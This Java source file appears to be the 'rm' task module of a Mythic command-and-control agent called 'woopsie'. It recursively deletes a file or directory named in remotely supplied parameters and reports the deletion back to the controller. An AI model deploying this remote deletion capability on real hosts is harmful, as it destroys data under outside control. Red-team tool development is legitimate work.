package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

/**
 * Remove (delete) file or directory task
 */
public class RmTask implements Task {
    
    private final ObjectMapper objectMapper = new ObjectMapper();
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        // Extract path and host parameters
        String path = parameters.has("path") ? parameters.get("path").asText() : "";
        String host = parameters.has("host") ? parameters.get("host").asText() : "";
        
        if (path.isEmpty()) {
            throw new Exception("path parameter is required");
        }
        
        Config.debugLog(config, "Rm request - path: '" + path + "', host: '" + host + "'");
        
        // Resolve path
        Path filePath = Paths.get(path);
        Config.debugLog(config, "Initial path object: " + filePath);
        
        if (!filePath.isAbsolute()) {
            String cwd = System.getProperty("user.dir");
            filePath = Paths.get(cwd).resolve(path);
            Config.debugLog(config, "Resolved relative to CWD (" + cwd + "): " + filePath);
        }
        
        // Check if file exists
        if (!Files.exists(filePath)) {
            throw new Exception("File does not exist: " + filePath.toAbsolutePath());
        }
        
        // Get real path before deletion
        filePath = filePath.toRealPath();
        String fullPath = filePath.toString();
        Config.debugLog(config, "Real path: " + fullPath);
        
        // Delete file or directory
        if (Files.isDirectory(filePath)) {
            Config.debugLog(config, "Deleting directory recursively: " + fullPath);
            deleteDirectory(filePath.toFile());
        } else {
            Config.debugLog(config, "Deleting file: " + fullPath);
            Files.delete(filePath);
        }
        
        // Create removed_files structure for Mythic
        Map<String, Object> removedFile = new HashMap<>();
        removedFile.put("host", host);
        removedFile.put("path", fullPath);
        
        Map<String, Object> result = new HashMap<>();
        result.put("removed_files", new Object[]{removedFile});
        result.put("user_output", "Removed '" + fullPath + "'");
        
        return objectMapper.writeValueAsString(result);
    }
    
    /**
     * Recursively delete a directory and its contents
     */
    private void deleteDirectory(File dir) throws Exception {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteDirectory(file);
                } else {
                    if (!file.delete()) {
                        throw new Exception("Failed to delete file: " + file.getAbsolutePath());
                    }
                }
            }
        }
        if (!dir.delete()) {
            throw new Exception("Failed to delete directory: " + dir.getAbsolutePath());
        }
    }
    
    @Override
    public String getCommandName() {
        return "rm";
    }
}
